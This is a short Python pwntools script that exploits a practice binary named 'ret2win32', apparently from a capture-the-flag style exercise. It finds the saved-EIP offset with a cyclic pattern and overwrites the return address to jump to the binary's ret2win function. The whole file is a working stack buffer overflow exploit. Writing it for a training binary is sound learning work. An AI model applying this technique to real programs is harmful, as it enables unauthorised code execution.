#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./ret2win32', checksec=False)
context.log_level = 'debug'

# determine offset of EIP programmatically
io = process(context.binary.path)
payload = cyclic(0x100)
io.sendlineafter('> ', payload)
io.wait()
core = io.corefile
offset = cyclic_find(core.eip)

payload = p8(0x41) * offset
payload += p32(context.binary.symbols['ret2win'])
"""
payload = flat(
  asm('nop') * offset,
  context.binary.symbols['ret2win']
)
"""
io = process(context.binary.path)
io.sendlineafter('> ', payload)
io.readrepeatS()
